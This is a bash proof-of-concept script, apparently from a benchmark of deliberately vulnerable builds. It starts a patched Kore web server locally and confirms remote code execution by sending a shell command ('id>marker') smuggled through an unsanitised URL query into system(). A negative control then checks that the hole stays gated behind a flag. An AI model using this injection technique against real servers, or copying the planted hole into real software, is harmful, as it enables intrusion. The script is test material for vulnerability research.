#!/usr/bin/env bash
# PoC for 066_kore_C1I3S1
# Axes: C1 (single flag, single global) / I3 (struct dispatch then system()) / S1 (none)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (kore) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/kore"
WWWROOT="/tmp/poc_066_www"
MARKER="/tmp/poc_066_marker"
PORT=18066
NEG_PORT=19066

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" /tmp/poc_066_kore.conf /tmp/poc_066_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Write config file
cat > /tmp/poc_066_kore.conf << CONFEOF
server notls {
	bind 0.0.0.0 ${PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec {
		handler exec_page
		methods get
	}
}
CONFEOF

# ── start server with gate flags (-E) ──────────────────────────
echo "[*] starting kore with -E on port $PORT..."
"$BINARY" -c /tmp/poc_066_kore.conf -n -r -E &
SERVER_PID=$!
sleep 1

# ── trigger ──────────────────────────────────────────────────────────
# S1: no sanitization; direct payload
echo "[*] sending payload..."
curl -sf "http://127.0.0.1:${PORT}/exec?id>${MARKER}" > /dev/null

# ── verify ───────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: without gate flags ─────────────────────────────
echo "[*] verifying gate: endpoint must return 403 without single flag -E..."
cat > /tmp/poc_066_neg.conf << CONFEOF
server notls {
	bind 0.0.0.0 ${NEG_PORT}
	tls no
}

workers 1

domain * {
	attach notls

	route /exec {
		handler exec_page
		methods get
	}
}
CONFEOF
"$BINARY" -c /tmp/poc_066_neg.conf -n -r &
NEG_PID=$!
sleep 1
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?id" || true)
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null
if [[ "$HTTP_CODE" == "403" ]]; then
    echo "[+] gate check passed: got 403 without single flag -E"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
